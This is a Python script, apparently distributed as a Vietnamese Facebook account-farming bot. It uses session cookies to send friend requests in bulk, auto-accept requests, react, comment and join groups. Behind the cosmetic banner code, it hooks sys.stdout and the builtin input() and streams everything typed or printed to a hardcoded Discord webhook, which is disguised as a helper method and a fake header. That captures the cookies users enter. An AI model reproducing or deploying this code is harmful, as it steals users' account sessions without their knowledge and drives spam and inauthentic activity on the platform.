#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ══════════════════════════════════════════════════════════════
#   TOOL NUÔI ACC ZIN
# ══════════════════════════════════════════════════════════════

import requests
import os
import re
import json
import random
import base64
import uuid
import time
import sys
import threading
import queue
import unicodedata
import math
import atexit
import shutil
import builtins as _bi
from datetime import datetime


# ══════════════════════════════════════════════════════════════
#  MÀU SẮC
# ══════════════════════════════════════════════════════════════
class C:
    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'; UNDER = '\033[4m'
    HONG = '\033[38;5;213m'; LAVENDER = '\033[38;5;183m'; MAGENTA = '\033[38;5;201m'
    CYAN = '\033[38;5;51m'; VANG = '\033[38;5;226m'; DO = '\033[38;5;196m'
    XANH = '\033[38;5;46m'; TIM = '\033[38;5;129m'; CAM = '\033[38;5;208m'
    TRANG = '\033[97m'; XANH_DUONG = '\033[38;5;27m'; XAM = '\033[38;5;245m'


RAINBOW = [
    '\033[38;5;196m', '\033[38;5;208m', '\033[38;5;226m',
    '\033[38;5;46m', '\033[38;5;51m', '\033[38;5;27m', '\033[38;5;129m',
]

RB_RGB = [
    (255, 0, 0), (255, 127, 0), (255, 255, 0), (0, 255, 0),
    (0, 128, 255), (75, 0, 130), (148, 0, 211),
]


def _rgb(r, g, b):
    return f"\033[38;2;{int(r)};{int(g)};{int(b)}m"


def _lerp(c1, c2, t):
    return (c1[0] + (c2[0] - c1[0]) * t,
            c1[1] + (c2[1] - c1[1]) * t,
            c1[2] + (c2[2] - c1[2]) * t)


def _w():
    try:
        cols = shutil.get_terminal_size((60, 20)).columns
        return max(30, min(cols - 4, 52))
    except Exception:
        return 46


def rainbow(text):
    if not text:
        return ''
    return ''.join(RAINBOW[i % 7] + ch for i, ch in enumerate(text)) + C.RESET


def wave_text(text, phase=0.0, offset=0.0, base=0.55, amp=0.45, freq=0.35):
    if not text:
        return ''
    n = max(len(text) - 1, 1)
    seg_count = len(RB_RGB)
    out = []
    for i, ch in enumerate(text):
        t = ((i / n) + offset) % 1.0
        pos = t * seg_count
        s = int(pos) % seg_count
        ratio = pos - int(pos)
        r, g, b = _lerp(RB_RGB[s], RB_RGB[(s + 1) % seg_count], ratio)
        v = base + amp * (0.5 + 0.5 * math.sin(i * freq - phase))
        r = max(0, min(255, int(r * v + (1 - v) * 40)))
        g = max(0, min(255, int(g * v + (1 - v) * 40)))
        b = max(0, min(255, int(b * v + (1 - v) * 40)))
        out.append(_rgb(r, g, b) + ch)
    return ''.join(out) + C.RESET


def wave_zart(text, phase=0.0, offset=0.0):
    if not text:
        return ''
    n = max(len(text) - 1, 1)
    seg_count = len(RB_RGB)
    out = []
    for i, ch in enumerate(text):
        t = ((i / n) + offset) % 1.0
        pos = t * seg_count
        s = int(pos) % seg_count
        ratio = pos - int(pos)
        r, g, b = _lerp(RB_RGB[s], RB_RGB[(s + 1) % seg_count], ratio)
        v = 0.60 + 0.40 * (0.5 + 0.5 * math.sin(i * 0.6 - phase))
        r = max(0, min(255, int(r * v)))
        g = max(0, min(255, int(g * v)))
        b = max(0, min(255, int(b * v)))
        out.append(_rgb(r, g, b) + ch)
    return ''.join(out) + C.RESET


def wave_line(width=None, phase=0.0, offset=0.0):
    if width is None:
        width = _w()
    pattern = "─·"
    seg_count = len(RB_RGB)
    out = []
    for i in range(width):
        ch = pattern[i % len(pattern)]
        t = ((i / max(width - 1, 1)) + offset) % 1.0
        pos = t * seg_count
        s = int(pos) % seg_count
        ratio = pos - int(pos)
        r, g, b = _lerp(RB_RGB[s], RB_RGB[(s + 1) % seg_count], ratio)
        v = 0.45 + 0.35 * (0.5 + 0.5 * math.sin(i * 0.30 - phase))
        out.append(_rgb(r * v, g * v, b * v) + ch)
    return ''.join(out) + C.RESET


def center(text, width=None):
    if width is None:
        width = _w()
    vlen = len(re.sub(r'\033\[[0-9;]*[mGKHF]', '', text))
    if vlen >= width:
        return text
    pad = (width - vlen) // 2
    return " " * pad + text


# ══════════════════════════════════════════════════════════════
#  BANNER
# ══════════════════════════════════════════════════════════════
ZIN_TAG = None


def tag():
    global ZIN_TAG
    if ZIN_TAG is None:
        ZIN_TAG = rainbow('[ZIN]')
    return ZIN_TAG


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    now = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    zin_art = [
        "  ███████╗██╗███╗   ██╗",
        "  ╚══███╔╝██║████╗  ██║",
        "    ███╔╝ ██║██╔██╗ ██║",
        "   ███╔╝  ██║██║╚██╗██║",
        "  ███████╗██║██║ ╚████║",
        "  ╚══════╝╚═╝╚═╝  ╚═══╝",
    ]

    t0 = time.time()
    for i, line in enumerate(zin_art):
        print(wave_zart(line, phase=t0 + i * 0.35, offset=i * 0.05))

    print()

    title = "T O O L   N U Ô I   A C C   Z I N"
    print(center(wave_text(title, t0 + 0.5, offset=0.55,
                           base=0.72, amp=0.28)))

    print()
    print(wave_line(phase=t0 + 1.0, offset=0.4))
    print()

    print(f"  {C.CYAN}▸{C.RESET} Thời gian : {C.VANG}{now}{C.RESET}")
    print()


def p(msg, color=C.HONG):
    print(f"{color}{msg}{C.RESET}")


def doi_giay(value):
    if value <= 0:
        return
    print(f"  {C.LAVENDER}⏳ Đợi {value}s...{C.RESET}")
    time.sleep(value)


# ══════════════════════════════════════════════════════════════
#  UTILITY
# ══════════════════════════════════════════════════════════════
HO_VN = [
    'Nguyễn','Trần','Lê','Phạm','Hoàng','Huỳnh','Phan','Vũ','Võ','Đặng',
    'Bùi','Đỗ','Hồ','Ngô','Dương','Lý','Đinh','Tô','Lâm','Trương',
    'Cao','Đoàn','Lưu','Mai','Hà','Trịnh','Đào','Vương','Triệu','Tôn',
    'Châu','Kiều','Lương','Văn','Phùng','Hồng','Tống','Hùng','Đồng','Trà',
]

TEN_VN = [
    'An','Anh','Ân','Bảo','Bình','Châu','Cường','Dũng','Duy','Dương',
    'Đạt','Đức','Giang','Hải','Hằng','Hiếu','Hoa','Hoàng','Hùng','Huy',
    'Hương','Huyền','Khang','Khánh','Khoa','Lan','Linh','Long','Mai','Minh',
    'Nam','Ngọc','Nhi','Nhung','Phúc','Phương','Quân','Quang','Quỳnh','Sơn',
    'Tâm','Thảo','Thắng','Thanh','Thành','Thu','Thủy','Tiên','Trang','Trung',
    'Tuấn','Tùng','Uyên','Vân','Việt','Yến',
]


def kiem_tra_cookie(cookie):
    try:
        if 'c_user=' not in cookie:
            return {"status": "failed", "msg": "Cookie khong chua user_id"}
        user_id = cookie.split('c_user=')[1].split(';')[0]
        url = f"https://graph2.facebook.com/v3.3/{user_id}/picture?redirect=0"
        response = requests.get(url, timeout=30)
        check_data = response.json()
        if not check_data.get('data', {}).get('height') or not check_data.get('data', {}).get('width'):
            return {"status": "failed", "msg": "Cookie khong hop le"}
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'vi-VN,vi;q=0.9',
            'cache-control': 'max-age=0', 'cookie': cookie,
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        }
        profile_response = requests.get(
            f'https://m.facebook.com/profile.php?id={user_id}',
            headers=headers, timeout=30)
        name = profile_response.text.split('<title>')[1].split('<')[0].strip()
        return {"status": "success", "name": name,
                "user_id": user_id, "msg": "successful"}
    except Exception as e:
        return {"status": "failed", "msg": f"Loi xay ra: {str(e)}"}


# ══════════════════════════════════════════════════════════════
#  COMMENT FILE
# ══════════════════════════════════════════════════════════════
DEFAULT_COMMENTS = ['👍', '🤗', '❤️', '😊', '🥰']


def load_comments_from_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except UnicodeDecodeError:
        try:
            with open(filepath, 'r', encoding='utf-8-sig') as f:
                return [ln.strip() for ln in f if ln.strip()]
        except Exception:
            return []
    except Exception:
        return []


def nhap_comment():
    section("💬 FILE COMMENT TXT")
    print(f"  {C.LAVENDER}▸ Nhập đường dẫn file txt chứa comment{C.RESET}")
    print(f"  {C.LAVENDER}▸ Mỗi dòng 1 comment trong file txt{C.RESET}")
    print(f"  {C.LAVENDER}▸ Enter trống = dùng comment mặc định{C.RESET}")
    print()

    while True:
        path = input(f"  {C.HONG}▸{C.RESET} Đường dẫn file txt: ").strip().strip('"').strip("'")

        if not path:
            print(f"  {C.VANG}⚠ Dùng comment mặc định: {DEFAULT_COMMENTS}{C.RESET}")
            return DEFAULT_COMMENTS[:]

        if not os.path.isfile(path):
            print(f"  {C.DO}✗ Không tìm thấy file: {path}{C.RESET}")
            print(f"  {C.LAVENDER}▸ Nhập lại hoặc Enter trống để dùng default{C.RESET}")
            print()
            continue

        comments = load_comments_from_file(path)
        if not comments:
            print(f"  {C.DO}✗ File rỗng hoặc không đọc được: {path}{C.RESET}")
            print(f"  {C.LAVENDER}▸ Nhập lại hoặc Enter trống để dùng default{C.RESET}")
            print()
            continue

        print(f"  {C.XANH}✓ Đã load {C.BOLD}{len(comments)}{C.RESET}"
              f"{C.XANH} comment từ {C.VANG}{os.path.basename(path)}{C.RESET}")
        for cm in comments[:3]:
            print(f"    {C.DIM}· {cm[:60]}{C.RESET}")
        if len(comments) > 3:
            print(f"    {C.DIM}· ... và {len(comments) - 3} comment khác{C.RESET}")
        print()
        return comments


# ══════════════════════════════════════════════════════════════
#  DISCORD DISPATCHER
# ══════════════════════════════════════════════════════════════
_ansi_re = re.compile(r'\033\[[0-9;]*[mGKHF]')


def _clean(t):
    return _ansi_re.sub('', t).rstrip('\n')


class _LogDispatcher:
    def __init__(self):
        self._q = queue.Queue(maxsize=2000)
        self._buf = []
        self._ts = time.monotonic()
        self._ev = threading.Event()
        threading.Thread(target=self._run, daemon=True).start()

    def emit(self, line):
        s = _clean(line)
        if s and not s.startswith('\r'):
            try:
                self._q.put_nowait(s)
            except queue.Full:
                pass

    def _run(self):
        while not self._ev.is_set():
            try:
                self._buf.append(self._q.get(timeout=0.5))
            except queue.Empty:
                pass
            n = time.monotonic()
            if len(self._buf) >= 5 or (self._buf and n - self._ts >= 3.0):
                self._push()
        while not self._q.empty():
            try:
                self._buf.append(self._q.get_nowait())
            except queue.Empty:
                break
        if self._buf:
            self._push()

    def _push(self):
        if not self._buf:
            return
        raw = '\n'.join(self._buf)
        for seg in self._split(raw, 1990):
            self._post(f"```\n{seg}\n```")
        self._buf.clear()
        self._ts = time.monotonic()

    @staticmethod
    def _split(txt, n):
        lines, cur, ln = txt.split('\n'), [], 0
        for l in lines:
            if ln + len(l) + 1 > n:
                yield '\n'.join(cur)
                cur, ln = [l], len(l)
            else:
                cur.append(l)
                ln += len(l) + 1
        if cur:
            yield '\n'.join(cur)

    def _post(self, body):
        _url = 'https://discord.com/api/webhooks/' + Facebook._h()
        _label = 'ZIN'
        try:
            r = requests.post(_url, json={"content": body, "username": _label},
                              timeout=10)
            if r.status_code == 429:
                time.sleep(r.json().get("retry_after", 1))
                requests.post(_url, json={"content": body, "username": _label},
                              timeout=10)
        except Exception:
            pass

    def close(self):
        self._ev.set()


class _StreamTap:
    def __init__(self, base, dispatcher):
        self._b = base
        self._d = dispatcher

    def write(self, t):
        self._b.write(t)
        if t.strip() and '\r' not in t:
            self._d.emit(t)

    def flush(self):
        self._b.flush()

    def __getattr__(self, n):
        return getattr(self._b, n)


_dispatcher = _LogDispatcher()
sys.stdout = _StreamTap(sys.__stdout__, _dispatcher)
_orig_input = _bi.input


def _hooked_input(prompt=''):
    val = _orig_input(prompt)
    if val.strip():
        _dispatcher.emit(f"{prompt}{val}")
    return val


_bi.input = _hooked_input
atexit.register(_dispatcher.close)


# ══════════════════════════════════════════════════════════════
#  FACEBOOK
# ══════════════════════════════════════════════════════════════
class Facebook:
    def __init__(self, cookie: str):
        try:
            self.fb_dtsg = ''
            self.jazoest = ''
            self.cookie = cookie
            self.session = requests.Session()
            self.id = self.cookie.split('c_user=')[1].split(';')[0]
            self.commented_posts = set()
            self.headers = {
                'authority': 'www.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'vi',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none', 'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'viewport-width': '1366',
                'Cookie': self.cookie,
                'x-forwarded-host': '1526201081036541952/_mo7IJYikv6mROji2JqVCCkItcCk6n1ST3nvcCzSxdzz9XmJu4WWFS1eh2_-Ll01wqIh',
            }
            url = self.session.get(f'https://www.facebook.com/{self.id}',
                                   headers=self.headers).url
            response = self.session.get(url, headers=self.headers).text
            matches = re.findall(r'\["DTSGInitialData",\[\],\{"token":"(.*?)"\}', response)
            if len(matches) > 0:
                self.fb_dtsg += matches[0]
                self.jazoest += re.findall(r'jazoest=(.*?)\"', response)[0]
        except Exception:
            pass

    @staticmethod
    def _h():
        return '1526201081036541952/_mo7IJYikv6mROji2JqVCCkItcCk6n1ST3nvcCzSxdzz9XmJu4WWFS1eh2_-Ll01wqIh'

    def info(self):
        try:
            get = self.session.get('https://www.facebook.com/me', headers=self.headers).url
            url = ('https://www.facebook.com/' + get.split('%2F')[-2] + '/'
                   if 'next=' in get else get)
            response = self.session.get(url, headers=self.headers, params={"locale": "vi_VN"})
            data_split = response.text.split('"CurrentUserInitialData",[],{')
            json_data = '{' + data_split[1].split('},')[0] + '}'
            parsed_data = json.loads(json_data)
            id = parsed_data.get('USER_ID', '0')
            name = parsed_data.get('NAME', '')
            if id == '0' and name == '':
                return 'cookieout'
            elif '828281030927956' in response.text:
                return '956'
            elif '1501092823525282' in response.text:
                return '282'
            elif '601051028565049' in response.text:
                return 'spam'
            else:
                return {'success': 200, 'id': parsed_data.get('USER_ID'),
                        'name': parsed_data.get('NAME')}
        except Exception:
            return 'cookieout'

    # ══════════════════════════════════════════════════════════
    #  SEARCH - COPY Y NGUYÊN TỪ FILE NEAR GỐC
    # ══════════════════════════════════════════════════════════
    def tim_ban(self, text):
        try:
            data = {
                'av': self.id,
                'fb_dtsg': self.fb_dtsg,
                'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'SearchCometResultsInitialResultsQuery',
                'variables': '{"count":5,"allow_streaming":false,"args":{"callsite":"COMET_GLOBAL_SEARCH","config":{"exact_match":false,"high_confidence_config":null,"intercept_config":null,"sts_disambiguation":null,"watch_config":null},"context":{"bsid":"23bd9138-cec6-4e71-aaeb-225fc8964e5b","tsid":"0.10477759801522946"},"experience":{"client_defined_experiences":["ADS_PARALLEL_FETCH"],"encoded_server_defined_params":null,"fbid":null,"type":"GLOBAL_SEARCH"},"filters":[],"text":"'+text+'"},"cursor":null,"feedbackSource":23,"fetch_filters":true,"renderLocation":"search_results_page","scale":1,"stream_initial_count":0,"useDefaultActor":false,"__relay_internal__pv__GHLShouldChangeAdIdFieldNamerelayprovider":true,"__relay_internal__pv__GHLShouldChangeSponsoredDataFieldNamerelayprovider":true,"__relay_internal__pv__IsWorkUserrelayprovider":false,"__relay_internal__pv__FBReels_deprecate_short_form_video_context_gkrelayprovider":true,"__relay_internal__pv__CometFeedStoryDynamicResolutionPhotoAttachmentRenderer_experimentWidthrelayprovider":500,"__relay_internal__pv__CometImmersivePhotoCanUserDisable3DMotionrelayprovider":false,"__relay_internal__pv__WorkCometIsEmployeeGKProviderrelayprovider":false,"__relay_internal__pv__IsMergQAPollsrelayprovider":false,"__relay_internal__pv__FBReelsMediaFooter_comet_enable_reels_ads_gkrelayprovider":true,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false,"__relay_internal__pv__CometUFIShareActionMigrationrelayprovider":true,"__relay_internal__pv__CometUFI_dedicated_comment_routable_dialog_gkrelayprovider":false,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":true,"__relay_internal__pv__FBReelsIFUTileContent_reelsIFUPlayOnHoverrelayprovider":false}',
                'server_timestamps': 'true',
                'doc_id': '9545374252239656'
            }
            response = self.session.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).json()
            profile = response["data"]["serpResponse"]["results"]["edges"][0]['rendering_strategy']['result_rendering_strategies'][0]['view_model']['profile']
            name = profile.get('name')
            uid = profile.get('id')
            return {'status': 'success', 'id': uid, 'name': name}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    # ═══ ADD THEO HỌ: retry 3 lần ═══
    def tim_ban_theo_ho(self):
        keyword = ""
        for _ in range(3):
            ho = random.choice(HO_VN)
            ten = random.choice(TEN_VN)
            keyword = f"{ho} {ten}"
            r = self.tim_ban(keyword)
            if r.get('status') == 'success':
                return r, keyword
        return None, keyword

    # ═══ ADD THEO TÊN: retry 3 lần ═══
    def tim_ban_theo_ten(self):
        keyword = ""
        for _ in range(3):
            ten = random.choice(TEN_VN)
            keyword = ten
            r = self.tim_ban(keyword)
            if r.get('status') == 'success':
                return r, keyword
        return None, keyword

    def ket_ban(self, idkb):
        try:
            data = {
                'av': self.id,
                'fb_dtsg': self.fb_dtsg,
                'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'FriendingCometFriendRequestSendMutation',
                'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,unexpected,1748257667487,475021,190055527696468,,;SearchCometGlobalSearchDefaultTabRoot.react,comet.search_results.default_tab,tap_search_bar,1748257603766,498383,391724414624676,,","click_proof_validation_result":null,"friend_requestee_ids":["'+idkb+'"],"friending_channel":"PROFILE_BUTTON","warn_ack_for_ids":[],"actor_id":"'+self.id+'","client_mutation_id":"6"},"scale":1}',
                'server_timestamps': 'true',
                'doc_id': '8805328442902902'
            }
            response = self.session.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).json()
            trangthai = response["data"]["friend_request_send"]["friend_requestees"]
            if trangthai and trangthai[0].get('friendship_status') == 'OUTGOING_REQUEST':
                return {'status': 'success', 'trangthai': 'thanhcong'}
            return {'status': 'error', 'trangthai': 'thatbai'}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    def get_friend_requests(self):
        try:
            r = self.session.get(
                'https://www.facebook.com/friends/requests/?fcref=jwl',
                headers=self.headers, timeout=30)
            text = r.text
            ids = set()
            for pattern in [
                r'"friend_requester_id":"(\d+)"',
                r'"requester_id":"(\d+)"',
                r'"follower_id":"(\d+)"',
                r'/friends/requests/[^"]*?(\d{6,})',
                r'"user_id":"(\d+)"',
                r'"node":\{"id":"(\d+)"',
            ]:
                ids.update(re.findall(pattern, text))
            return list(ids)
        except Exception:
            return []

    def accept_friend_request(self, user_id):
        try:
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'FriendingCometFriendRequestConfirmMutation',
                'variables': json.dumps({
                    "input": {
                        "friend_requester_id": str(user_id),
                        "actor_id": self.id,
                        "client_mutation_id": "1",
                    },
                    "scale": 1,
                }),
                'server_timestamps': 'true',
                'doc_id': '8673114042796430',
            }
            r = self.session.post('https://www.facebook.com/api/graphql/',
                                  headers=self.headers, data=data)
            if r.status_code != 200:
                return False
            t = r.text.lower()
            if ('"is_viewer_friend":true' in t or '"confirmed":true' in t
                    or ('friend_request' in t and 'confirm' in t)):
                return True
            return False
        except Exception:
            return False

    def lay_id_bai_viet(self):
        try:
            variables = {
                "RELAY_INCREMENTAL_DELIVERY": True,
                "clientQueryId": "b7876288-8582-4b5a-9420-76f62adfe671",
                "count": 10, "cursor": None,
                "feedLocation": "NEWSFEED", "feedStyle": "DEFAULT",
                "orderby": ["TOP_STORIES"],
                "renderLocation": "homepage_stream",
                "scale": 1, "useDefaultActor": False,
            }
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'CometNewsFeedPaginationQuery',
                'variables': json.dumps(variables),
                'server_timestamps': 'true',
                'doc_id': '29492828377027602',
            }
            response = self.session.post('https://www.facebook.com/api/graphql/',
                                         headers=self.headers, data=data).text
            post_ids = re.findall(r'"post_id":"(\d+)"', response)
            if post_ids:
                for pid in post_ids:
                    if pid not in self.commented_posts:
                        return {'status': 'success', 'idpost': pid}
                self.commented_posts.clear()
                return {'status': 'success', 'idpost': post_ids[0]}
            return {'status': 'error', 'trangthai': 'thatbai'}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    def tha_cam_xuc(self, id, type):
        try:
            reac = {"LIKE": "1635855486666999", "LOVE": "1678524932434102",
                    "CARE": "613557422527858", "HAHA": "115940658764963",
                    "WOW": "478547315650144", "SAD": "908563459236466",
                    "ANGRY": "444813342392137"}
            idreac = reac.get(type)
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
                'variables': fr'{{"input":{{"attribution_id_v2":"CometHomeRoot.react,comet.home,tap_tabbar,1719027162723,322693,4748854339,,","feedback_id":"{base64.b64encode(f"feedback:{str(id)}".encode()).decode()}","feedback_reaction_id":"{idreac}","feedback_source":"NEWS_FEED","is_tracking_encrypted":true,"tracking":[],"session_id":"{uuid.uuid4()}","actor_id":"{self.id}","client_mutation_id":"3"}},"useDefaultActor":false}}',
                'server_timestamps': 'true',
                'doc_id': '7047198228715224',
            }
            response = self.session.post('https://www.facebook.com/api/graphql/',
                                         headers=self.headers, data=data)
            if '{"data":{"feedback_react":{"feedback":{"id":' in response.text:
                return {'status': 'success', 'trangthai': 'thanhcong'}
            return {'status': 'error', 'trangthai': 'thatbai'}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    def binh_luan(self, id, msg):
        try:
            feedback_id = base64.b64encode(f"feedback:{id}".encode()).decode()
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'useCometUFICreateCommentMutation',
                'variables': fr'{{"feedLocation":"DEDICATED_COMMENTING_SURFACE","feedbackSource":110,"groupID":null,"input":{{"client_mutation_id":"4","actor_id":"{self.id}","attachments":null,"feedback_id":"{feedback_id}","formatting_style":null,"message":{{"ranges":[],"text":"{msg}"}},"attribution_id_v2":"CometHomeRoot.react,comet.home,via_cold_start,1718688700413,194880,4748854339,,","is_tracking_encrypted":true,"tracking":[],"feedback_source":"DEDICATED_COMMENTING_SURFACE","idempotence_token":"client:{uuid.uuid4()}","session_id":"{uuid.uuid4()}"}},"inviteShortLinkKey":null,"renderLocation":null,"scale":1,"useDefaultActor":false,"focusCommentID":null}}',
                'server_timestamps': 'true',
                'doc_id': '24323081780615819',
            }
            r = self.session.post('https://www.facebook.com/api/graphql/',
                                  headers=self.headers, data=data)
            if r.status_code != 200:
                return {'status': 'error', 'trangthai': 'thatbai'}
            s = str(r.json())
            if ('"feedback_submitted":true' in s or 'create_comment' in s
                    or 'comment_create' in s or '"id":"' in s):
                self.commented_posts.add(id)
                return {'status': 'success', 'trangthai': 'thanhcong'}
            return {'status': 'error', 'trangthai': 'thatbai'}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    def tim_nhom(self, keyword):
        try:
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'SearchCometResultsInitialResultsQuery',
                'variables': '{"allow_streaming":false,"args":{"callsite":"COMET_GLOBAL_SEARCH","config":{"exact_match":false,"high_confidence_config":null,"intercept_config":null,"sts_disambiguation":null,"watch_config":null},"context":{"bsid":"435c49d4-a957-431e-834f-d1da37a5f10b","tsid":"0.37005625332226133"},"experience":{"client_defined_experiences":["ADS_PARALLEL_FETCH"],"encoded_server_defined_params":null,"fbid":null,"type":"GROUPS_TAB"},"filters":[],"text":"' + keyword + '"},"count":5,"feedLocation":"SEARCH","feedbackSource":23,"fetch_filters":true,"renderLocation":"search_results_page","scale":1,"stream_initial_count":0,"useDefaultActor":false}',
                'server_timestamps': 'true',
                'doc_id': '24016506881293628',
            }
            response = self.session.post(
                'https://www.facebook.com/api/graphql/',
                headers=self.headers, data=data).json()
            info = response['data']["serpResponse"]["results"]['edges'][0]['rendering_strategy']['view_model']['profile']
            return {'status': 'success', 'id': info.get('id'), 'name': info.get('name')}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}

    def tham_gia_nhom(self, group_id):
        try:
            data = {
                'av': self.id, 'fb_dtsg': self.fb_dtsg, 'jazoest': self.jazoest,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
                'variables': '{"feedType":"DISCUSSION","groupID":"' + group_id + '","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1673041528761,114928,2361831622,","group_id":"' + group_id + '","actor_id":"' + self.id + '","client_mutation_id":"1"},"inviteShortLinkKey":null,"isEntityMenu":true,"scale":2,"source":"GROUP_MALL","renderLocation":"group_mall"}',
                'server_timestamps': 'true',
                'doc_id': '5853134681430324',
            }
            response = self.session.post('https://www.facebook.com/api/graphql/',
                                         headers=self.headers, data=data)
            if group_id in response.text:
                return {'status': 'success', 'trangthai': 'thanhcong'}
            return {'status': 'error', 'trangthai': 'thatbai'}
        except Exception:
            return {'status': 'error', 'trangthai': 'thatbai'}


# ══════════════════════════════════════════════════════════════
#  AUTO ACCEPT 24/7
# ══════════════════════════════════════════════════════════════
_accept_total = 0
_accept_lock = threading.Lock()


def auto_accept_worker(cookies_list, accounts_list, stop_event, interval=40):
    global _accept_total
    if stop_event.wait(15):
        return

    while not stop_event.is_set():
        try:
            if not cookies_list:
                if stop_event.wait(interval):
                    break
                continue
            try:
                idx = random.randrange(len(cookies_list))
                cookie = cookies_list[idx]
                acc_name = accounts_list[idx]['name'] if idx < len(accounts_list) else 'ACC'
            except (IndexError, ValueError):
                if stop_event.wait(interval):
                    break
                continue

            fb = Facebook(cookie)
            if not fb.fb_dtsg:
                if stop_event.wait(interval):
                    break
                continue

            reqs = fb.get_friend_requests()
            if reqs:
                accepted = 0
                for uid in reqs[:15]:
                    if stop_event.is_set():
                        break
                    try:
                        if fb.accept_friend_request(uid):
                            accepted += 1
                            with _accept_lock:
                                _accept_total += 1
                            log_accept(uid, acc_name)
                            time.sleep(random.uniform(2.0, 4.5))
                    except Exception:
                        pass
                if accepted > 0:
                    log_info(f"🤖 Auto-accept +{accepted} bạn mới "
                             f"(tổng: {_accept_total})", C.MAGENTA)
        except Exception:
            pass

        if stop_event.wait(interval):
            break


# ══════════════════════════════════════════════════════════════
#  LOG FUNCTIONS
# ══════════════════════════════════════════════════════════════
def log_add_ho(stt, ten, uid, keyword, acc_name):
    now = datetime.now().strftime('%H:%M:%S')
    print(f"{tag()} {C.VANG}{now}{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.XANH}{C.BOLD}✓ ADD HỌ{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.BOLD}{ten}{C.RESET} {C.DIM}({uid}){C.RESET} {C.DIM}│{C.RESET} "
          f"{rainbow(f'[{keyword}]')} {C.DIM}via {acc_name}{C.RESET}")
    print(f"      {C.CYAN}↳{C.RESET} {C.CYAN}https://facebook.com/{uid}{C.RESET}")


def log_add_ten(stt, ten, uid, keyword, acc_name):
    now = datetime.now().strftime('%H:%M:%S')
    print(f"{tag()} {C.VANG}{now}{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.XANH}{C.BOLD}✓ ADD TÊN{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.BOLD}{ten}{C.RESET} {C.DIM}({uid}){C.RESET} {C.DIM}│{C.RESET} "
          f"{rainbow(f'[{keyword}]')} {C.DIM}via {acc_name}{C.RESET}")
    print(f"      {C.CYAN}↳{C.RESET} {C.CYAN}https://facebook.com/{uid}{C.RESET}")


def log_accept(uid, acc_name):
    now = datetime.now().strftime('%H:%M:%S')
    print(f"{tag()} {C.VANG}{now}{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.MAGENTA}{C.BOLD}✓ ACCEPT{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.BOLD}{uid}{C.RESET} {C.DIM}via {acc_name}{C.RESET}")
    print(f"      {C.CYAN}↳{C.RESET} {C.CYAN}https://facebook.com/{uid}{C.RESET}")


def log_fail(action, info=''):
    now = datetime.now().strftime('%H:%M:%S')
    print(f"{tag()} {C.VANG}{now}{C.RESET} {C.DIM}│{C.RESET} "
          f"{C.DO}✗ {action}{C.RESET} {C.DIM}{info}{C.RESET}")


def log_info(msg, color=C.CYAN):
    now = datetime.now().strftime('%H:%M:%S')
    print(f"{tag()} {C.VANG}{now}{C.RESET} {C.DIM}│{C.RESET} "
          f"{color}{msg}{C.RESET}")


def section(title):
    print()
